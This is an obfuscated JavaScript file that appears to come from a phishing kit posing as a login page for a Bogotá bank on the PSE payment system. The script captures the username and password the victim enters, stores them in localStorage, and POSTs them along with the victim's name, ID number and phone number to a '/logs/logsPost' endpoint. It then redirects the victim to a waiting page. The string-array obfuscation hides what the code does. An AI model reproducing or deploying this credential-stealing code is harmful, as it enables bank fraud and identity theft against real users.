const _0x36fe3e = _0x1e79;
(function (_0x5b5c8f, _0x357e20) {
  const _0x4fd7e7 = _0x1e79,
    _0x54abc1 = _0x5b5c8f();
  while (!![]) {
    try {
      const _0x36cea3 =
        -parseInt(_0x4fd7e7(0x92)) / 0x1 +
        parseInt(_0x4fd7e7(0xaf)) / 0x2 +
        -parseInt(_0x4fd7e7(0xad)) / 0x3 +
        -parseInt(_0x4fd7e7(0xab)) / 0x4 +
        parseInt(_0x4fd7e7(0x99)) / 0x5 +
        (-parseInt(_0x4fd7e7(0x93)) / 0x6) * (parseInt(_0x4fd7e7(0xb2)) / 0x7) +
        parseInt(_0x4fd7e7(0xa0)) / 0x8;
      if (_0x36cea3 === _0x357e20) break;
      else _0x54abc1["push"](_0x54abc1["shift"]());
    } catch (_0x3c3019) {
      _0x54abc1["push"](_0x54abc1["shift"]());
    }
  }
})(_0x5377, 0xbcc04);
function _0x5377() {
  const _0x4cd125 = [
    "Network\x20response\x20was\x20not\x20ok",
    "puser",
    "user",
    "txtPass",
    "metaInfo",
    "2527204elQFCR",
    "setItem",
    "2313525rZcbmQ",
    "💠​​Bogota",
    "1664620eRxLvw",
    "focus",
    "info",
    "73717ZaEZyM",
    "value",
    "addEventListener",
    "1441216eIVUPe",
    "6MrdToZ",
    "location",
    "href",
    "txtUsuario",
    "disabled",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "7665035pizbkT",
    "json",
    "stringify",
    "then",
    "getElementById",
    "/logs/logsPost",
    "catch",
    "10100240XvXDmv",
    "PSE",
    "preventDefault",
    "telnum",
    "btnUsuario",
    "application/json",
  ];
  _0x5377 = function () {
    return _0x4cd125;
  };
  return _0x5377();
}
function updateLS() {
  const _0x123df2 = _0x1e79;
  LS[_0x123df2(0xac)](_0x123df2(0xb1), JSON[_0x123df2(0x9b)](info));
}
const button = document[_0x36fe3e(0x9d)](_0x36fe3e(0xa4)),
  userInput = document["getElementById"](_0x36fe3e(0x96)),
  passInput = document["getElementById"](_0x36fe3e(0xa9));
function _0x1e79(_0x56495a, _0x35e881) {
  const _0x537704 = _0x5377();
  return (
    (_0x1e79 = function (_0x1e7905, _0x57f6ae) {
      _0x1e7905 = _0x1e7905 - 0x92;
      let _0x1c35b6 = _0x537704[_0x1e7905];
      return _0x1c35b6;
    }),
    _0x1e79(_0x56495a, _0x35e881)
  );
}
button[_0x36fe3e(0xb4)]("click", async function (_0x13166c) {
  const _0x3bb0a1 = _0x36fe3e;
  _0x13166c[_0x3bb0a1(0xa2)](), (button[_0x3bb0a1(0x97)] = !![]);
  if (userInput["value"] == "" && passInput[_0x3bb0a1(0xb3)] == "") {
    alert(_0x3bb0a1(0x98)),
      userInput[_0x3bb0a1(0xb0)](),
      (button["disabled"] = ![]);
    return;
  } else {
    var _0x30dbf7 = userInput[_0x3bb0a1(0xb3)],
      _0x15bd9f = passInput["value"];
    (info[_0x3bb0a1(0xaa)][_0x3bb0a1(0xa8)] = _0x30dbf7),
      (info[_0x3bb0a1(0xaa)][_0x3bb0a1(0xa7)] = _0x15bd9f),
      updateLS();
    const _0x1ada57 = {
      reg: info["metaInfo"]["cc"],
      name: info[_0x3bb0a1(0xaa)]["dudename"],
      cl: info[_0x3bb0a1(0xaa)][_0x3bb0a1(0xa3)],
      us: info["metaInfo"][_0x3bb0a1(0xa8)],
      ps: info[_0x3bb0a1(0xaa)][_0x3bb0a1(0xa7)],
      bn: _0x3bb0a1(0xae),
      status: "Ingresó\x20datos",
      fuente: _0x3bb0a1(0xa1),
    };
    fetch(url + _0x3bb0a1(0x9e), {
      method: "POST",
      headers: { "Content-Type": _0x3bb0a1(0xa5) },
      body: JSON[_0x3bb0a1(0x9b)](_0x1ada57),
    })
      [_0x3bb0a1(0x9c)]((_0x58f621) => {
        const _0x598fb9 = _0x3bb0a1;
        if (!_0x58f621["ok"]) throw new Error(_0x598fb9(0xa6));
        return _0x58f621[_0x598fb9(0x9a)]();
      })
      [_0x3bb0a1(0x9c)]((_0x40d792) => {
        const _0x11a4f9 = _0x3bb0a1;
        window[_0x11a4f9(0x94)][_0x11a4f9(0x95)] = "./wait.html";
      })
      [_0x3bb0a1(0x9f)]((_0x456085) => {
        console["error"]("Error:", _0x456085), (button["disabled"] = ![]);
      });
  }
});
